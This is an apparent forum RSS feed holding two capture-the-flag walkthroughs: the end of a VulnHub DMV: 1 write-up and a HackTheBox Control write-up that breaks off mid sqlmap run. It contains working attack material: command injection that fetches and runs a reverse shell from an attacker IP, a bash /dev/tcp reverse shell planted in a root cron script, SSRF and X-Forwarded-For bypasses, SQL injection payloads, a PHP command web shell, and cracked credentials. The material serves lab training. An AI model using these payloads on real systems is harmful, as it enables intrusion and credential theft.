<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0c4375514562b6d339089ebb3ef1061fae3e7d2.png" alt="" data-base62-sha1="tMPHI0W4Lnwq02J6HP2nbt1kztM" width="690" height="264"></p>
<p>so we are going to use this from <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> let’s send that to our repeater and start typing several commands</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c50fe4762122dfa68889dfaf344d947c0edabc05.png" alt="" data-base62-sha1="s7i6SRHjsWyokkJWU6KacJQczC5" width="690" height="236"></p>
<p>as you see everything works but still something how to bypass the spaces thing !</p>
<p>if we run ls -la and URL Encode this we get an error message</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/be4c15725761627ddaf8fdece014a1e79aa47e2f.png" alt="" data-base62-sha1="r9rJ8UdStvgn4HwSgl1vTpFGqGX" width="690" height="161"></p>
<p>So I know a bash trick that allows you to bypass WAF and many other space restrictions</p>
<p>replace space with a special shell variable known as “${IFS}” <a href="https://bash.cyberciti.biz/guide/%24IFS" rel="noopener nofollow ugc">The Internal field separator</a></p>
<p>and here is a good List for bypassing I found on google (I didn’t try it but they seems correct)</p>
<aside class="onebox githubgist">
  <header class="source">
      <a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">gist.github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294</a></h4>
<h5>bypasses.txt</h5>
<pre><code class="Text"># SSRF localhost (@omespino)

http://127.0.0.1
http://[::]/                # ipv6
http://0/  
http://localtest.me         # dns to 127.0.0.1
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0x7f.0x00.0x00.0x01  # hex
http://0177.0.0.01          # octal</code></pre>
This file has been truncated. <a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">show original</a>

<p>
</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6c3ee0bb2c682a2169fe1427a2f57e24568e19c1.png" alt="" data-base62-sha1="frAhtZ0C6cj0Ki8zFI3HT9ONUFX" width="690" height="305"></p>
<p>So the easiest way to use this and for few spaces we should start the python SimpleHTTPServer and download our shell to this Box and run it</p>
<p>yt_url=%3c<code>cd${IFS}/var/www/html/images/;wget${IFS}http://192.168.56.1:8080/rev.py;python${IFS}rev.py</code></p>
<p>images is a writable folder we can find after using ls -la we have also tmp directory and the main is writable too but this just to check if we can run 3 commands in one line using (<img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> separator ,so let’s check if our Listener (nc) is UP and execute the command …</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c5c439454f4c1d8de7835fff263890ce87cb9a2b.png" alt="" data-base62-sha1="sdwt50TYRW9g4NuzbhBkrivBV47" width="689" height="175"></p>
<p>The response isn’t returning anything which means we are successfully connected to the shell <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>cat /etc/passwd<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
sync:x:4:65534:sync:/bin:/bin/sync<br>
games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
systemd-network:x:100:102:systemd Network Management,:/run/systemd/netif:/usr/sbin/nologin<br>
systemd-resolve:x:101:103:systemd Resolver,:/run/systemd/resolve:/usr/sbin/nologin<br>
syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>
lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>
dnsmasq:x:107:65534:dnsmasq,:/var/lib/misc:/usr/sbin/nologin<br>
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>
pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash</p>
<p>let’s search for the first flag</p>
<p>going to the main directory (/var/www/html/)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/859b6921293afd11aa536abe89259a6df3011dd8.png" alt="" data-base62-sha1="j3Wt6hUyK5ql9NKkuRISFZCfLvi" width="543" height="212"></p>
<p>you will find the first flag on the admin directory</p>
<p>cat /var/www/html/admin/flag.txt<br>
flag{0d8486a0c0c42503bb60ac77f4046ed7}</p>
<p>and also .htpasswd file</p>
<p>cat /var/www/html/admin/.htpasswd<br>
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</p>
<p>If we crack the hash using hashcat we’ll got <strong>jessie</strong></p>
<p>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie</p>
<p>maybe this will be useful for the root part …</p>
<p>Let’s go to the ROOT Part ! (is going to be short this time)</p>
<p>I uploaded many tools for enumeration as LinEnum and LinPeas but couldn’t find anything with these</p>
<p>I tried to use the password we found for the user dmv and nothing too !</p>
<p>I asked for a friend who did the box before I download it <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>and he said look in cronjobs but still not finding a thing here !</p>
<p>So I remember that I saw a file in /tmp/ directory named clean.sh with one line</p>
<p>rm -rf downloads</p>
<p>so it clear the bash script delete the folder “downloads” !</p>
<p>So I modified it and put this line</p>
<p>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1’</p>
<p>and I again run my listener on port 4444</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c4cabeb4906db70865d5901488e1f39a918e501c.png" alt="" data-base62-sha1="s4TXII6OZNxV6PscQKUJPJ1atpW" width="690" height="381"></p>
<p>and I was lucky we are r00t <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>So another way to get the root is using pspy a processor spy</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0d07fdbb8c75df7c7de997c9927ebee24009a37b.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">Releases · DominicBreuker/pspy</a></h3>

<p>Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>(All the releases are in the link above for both 32bits and 64bits)</p>
<p>from the command uname -a in your shell you’ll define the system CPU architecture</p>
<p>Linux dmv 4.15.0-96-generic <span class="hashtag">#97-Ubuntu</span> SMP Wed Apr 1 03:25:46 UTC 2020 <strong>x86_64</strong></p>
<p>let’s upload it to our shell and make it executable (chmod +x pspy64) and execute it</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22c9c58221fa0d6492229ec10d383cf407b5c489.png" alt="" data-base62-sha1="4XKwHCqHG0JuH3wUTyWcZ9P1tjP" width="690" height="123"></p>
<p>So as you see the task is executed each minute with root privileges and our injected reverse shell is still being executed.</p>
<p>I hope everything was clear and excuse my English I’m doing my best here <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864</link>
          <pubDate>Tue, 28 Apr 2020 14:33:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20864</guid>
          <source url="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864.rss">(VulnHub) [DMV: 1] WriteUp — Walkthrough</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Control</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><span alt="immagine" data-base62-sha1="2cskb7DrkLjzBT7MWtxIN8Rd5Ns" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Control is a Hard difficulty Windows box (yay!) that was just retired from HackTheBox. Control was a very good challenge, it starts out in a pretty generic manner, requiring the exploitation of a SQL injection flaw in a web application that only allows users connecting from a specific proxy, but when local access is established the real fun begins.</p>
<p>And by fun I mean trial and error, because there is quite a bit of guess work going on in the privilege escalation part, but even if the box doesn’t tell you what to do in a huge font it still leaves out some hints so that you can get there in the end, when you realize that in order to escalate privileges you have to find a Windows service of which you can change the properties from the registry to hijack its execution when it is then started, which I thought was a pretty cool idea.</p>
<hr>
<h2>Enumeration</h2>
<p>A full nmap scan doesn’t reveal a big attack surface, with just HTTP MS-RPC and MySQL available:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sudo nmap -sC -sV -p- -T5 -oA fullScan 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 21:17 CEST
Nmap scan report for 10.10.10.167
Host is up (0.064s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, JavaRMI, TerminalServer, WMSRequest: 
|_    Host '10.10.15.203' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=4/5%Time=5E8A301A%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TerminalServer,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(JavaRMI,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(W
SF:MSRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 371.52 seconds
</code></pre>
<p>The IIS web server has a neat little application running that looks like this:</p>
<p><span alt="immagine" data-base62-sha1="puHsBKqvZastaiRJTR40iicZdDd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The only apparently interesting feature here is the Admin button, upon clicking it we are given an error stating we must go through a proxy in order to access the page, and that this proxy is supposed to add a special header to our HTTP requests:</p>
<p><span alt="immagine" data-base62-sha1="64nD7oVuiGxZdU4GQo4OjYHoqc7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Here are a few headers commonly added by HTTP proxies when a client goes through one:</p>
<pre><code class="lang-http">X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>With a 127.0.0.1 address in, these headers actually become possible bypasses. A proxy will replace the 127.0.0.1 address with that of the client making the request to the application, which will check if the supplied IP is authorized to access the desired page.</p>
<p>Using 127.0.0.1 as the value of all these headers is a typical bypass based on the assumption that the server trusts requests coming from itself, thus thinking the requests come from a host that is authorized to access the application of interest.</p>
<p>Unfortunately for us, adding these headers manually with Burp and making a request to the Admin page returns the same exact error as before, meaning we are missing something. Perhaps localhost is not in the app’s access control whitelist. We’ll be back here soon.</p>
<p>Running Dirbuster allows to find a bunch of files and folders that are not apparent from the main site accessible to unauthenticated users, mainly the uploads folder and a bunch of PHP pages that have to do with product management of some sort (don’t mind the n2s.php page, it’s a web shell dropped by some other user):</p>
<p><span alt="immagine" data-base62-sha1="gWd5m27EFPYhJ7Vuxv8662TjHgc" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Other PHP pages are referenced by the /assets/js/functions.js script:</p>
<pre><code class="lang-auto">function deleteProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "delete_product.php";
	document.forms["viewProducts"].submit();
}
function updateProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "update_product.php";
	document.forms["viewProducts"].submit();
}
function viewProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "view_product.php";
	document.forms["viewProducts"].submit();
}
function deleteCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "delete_category.php";
	document.forms["categoryOptions"].submit();
}
function updateCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "update_category.php";
	document.forms["categoryOptions"].submit();
}
</code></pre>
<p>Plus, /assets/js/checkvalues.js implements some client-side checks for the validity of user supplied input, a probable indicator of custom code running in the web application’s Admin area where those product-related PHP pages can be accessed:</p>
<pre><code class="lang-auto">function checkValues(form) {
   if (form == "updateProduct") {
      var name = document.forms["updateProduct"]["name"].value;
      var quantity = document.forms["updateProduct"]["quantity"].value;
      var price = document.forms["updateProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createProduct") {
      var name = document.forms["createProduct"]["name"].value;
      var quantity = document.forms["createProduct"]["quantity"].value;
      var price = document.forms["createProduct"]["price"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity &lt; 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createCategory") {
      var name = document.forms["createCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   } else if (form == "updateCategory") {
      var name = document.forms["updateCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   }
   return true;
}
</code></pre>
<p>I tried fuzzing these pages and their parameters blindly with wfuzz but didn’t have any success in receiving interesting output from them.</p>
<p>Going back to the index of the web application a comment is found in the source code:</p>
<pre><code class="lang-auto">&lt;body class="is-preload landing"&gt;
	&lt;div id="page-wrapper"&gt;
		&lt;!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		&lt;!-- Header --&gt;
</code></pre>
<p>We can deduce from this comment that the web server is supposed to trust an external server hosting SSL certificates, with the IP address of this server we can try injecting the custom proxy headers again using the IP above instead of 127.0.0.1:</p>
<pre><code class="lang-http">X-Originating-IP: 192.168.4.28
X-Forwarded-For: 192.168.4.28
X-Remote-IP: 192.168.4.28
X-Remote-Addr: 192.168.4.28
</code></pre>
<p>It can be very uncomfortable running every request through Burp to add the headers every time since as soon as we click another link on the application a request without the header will be generated, causing us to see the error again.</p>
<p>To solve this issue I used the <a href="https://github.com/mirfansulaiman/CustomHeader" rel="nofollow noopener">CustomHeaders</a> Burp extension to add the headers automatically to every request caught by the Burp proxy:</p>
<p><span alt="immagine" data-base62-sha1="3lY9T4tfBnjM1CjcvqFdK2kM2L" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Adding all four headers with the correct IP address loads the admin page this time:</p>
<p><span alt="immagine" data-base62-sha1="lHTDCZsmWfy9TCQxtcpQ8ojt864" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Going by exclusion it turns out the correct proxy header the web application checks for is this one:</p>
<pre><code class="lang-http">X-Forwarded-For: 192.168.4.28
</code></pre>
<p>Anyway now that we can finally see and use the Admin page we can observe how those PHP pages from earlier are utilized. New products can be created:</p>
<p><span alt="immagine" data-base62-sha1="zZ74i2PYGgfoLpALYjyLIqAJYL9" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>As well as new categories:</p>
<p><span alt="immagine" data-base62-sha1="3jJoTPSHYRc36WXNNwJBEZ47Kqo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>After playing around with those functions I didn’t find them to be attackable, however SQL errors can be triggered by adding a single quote in the search field at the top of the page, so the search_products.php page appears to be vulnerable to SQL injection:</p>
<p><span alt="immagine" data-base62-sha1="1n6A1YzcmpzDxXR0uGdfft8Mtfu" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Exploitation: SQL Injection (DB dump, file upload)</h2>
<p>We can use sqlmap to exploit the flaw and dump the passwords in the databases, making sure to add the proxy header to the requests for good measure:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap --passwords -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:07:45 /2020-04-05/

[22:07:45] [INFO] resuming back-end DBMS 'mysql' 
[22:07:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[22:07:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[22:07:45] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:07:49] [INFO] writing hashes to a temporary file '/tmp/sqlmap0n205v2b6830/sqlmaphashes-krexg5ga.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8

[22:07:51] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[22:07:51] [WARNING] you haven't updated sqlmap for more than 64 days!!!

[*] ending @ 22:07:51 /2020-04-05/
</code></pre>
<p>The program was able to pull three different hashes as well as the usernames they belong to, two of those hashes are easily matched with cleartext passwords by <a href="https://crackstation.net/" rel="nofollow noopener">CrackStation</a> so we don’t even have to bruteforce anything:</p>
<p><span alt="immagine" data-base62-sha1="oKrCvGOelLYCIQgpGa3xjBYUzHK" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This gives us two sets of possible credentials:</p>
<pre><code class="lang-nohighlight">User: hector
Pass: l33th4x0rhector

User: manager
Pass: l3tm3!n
</code></pre>
<p>The first thing I tried doing with the credentials is connecting to the MySQL server using the mysql client, however we are not authorized to access the server:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ mysql -h 10.10.10.167 -u manager -p
Enter password: 
ERROR 1130 (HY000): Host '10.10.15.203' is not allowed to connect to this MariaDB server
</code></pre>
<p>So back to sqlmap, another possible way in is using the SQL injection vulnerability to upload arbitrary files on the server, like a simple PHP shell to execute shell commands. Here we’re going to have to guess the name of a directory we can write to, I went for the uploads folder found earlier and assumed it is located in the default IIS directory, C:\inetpub\wwwroot. Luckily the assumption was correct and the file was written on the server:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./baud.php --file-dest='C:\\inetpub\\wwwroot\\uploads\\baud3.php'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:27:43 /2020-04-06/

[17:27:43] [INFO] resuming back-end DBMS 'mysql' 
[17:27:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[17:27:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[17:27:43] [INFO] fingerprinting the back-end DBMS operating system
[17:27:43] [INFO] the back-end DBMS operating system is Windows
[17:27:44] [WARNING] potential permission problems detected ('Access denied')
[17:27:44] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)            
do you want confirmation that the local file 'baud.php' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/baud3.php')? [Y/n] y
[17:27:47] [INFO] the local file 'baud.php' and the remote file 'C:/inetpub/wwwroot/uploads/baud3.php' have the same size (80 B)
[17:27:47] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[17:27:47] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 17:27:47 /2020-04-06/
</code></pre>
<p>The shell is very simple and only has the purpose of giving me the ability to launch a different shell since I wasn’t able to execute OS commands from sqlmap itself using --os-cmd or --os-shell:</p>
<pre><code class="lang-auto">&lt;html&gt;
&lt;body&gt;
	&lt;pre&gt;
	&lt;?php
		system($_GET['cmd']);
	?&gt;
	&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The shell I want to launch makes use of <a href="https://eternallybored.org/misc/netcat/" rel="nofollow noopener">nc for Windows</a> so I uploaded the binary in the same folder as well:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./nc.exe --file-dest='C:\\inetpub\\wwwroot\\uploads\\nc.exe'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:24:01 /2020-04-06/

[23:24:01] [INFO] resuming back-end DBMS 'mysql' 
[23:24:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[23:24:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[23:24:02] [INFO] fingerprinting the back-end DBMS operating system
[23:24:02] [INFO] the back-end DBMS operating system is Windows
[23:24:02] [WARNING] potential permission problems detected ('Access denied')
[23:24:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)              
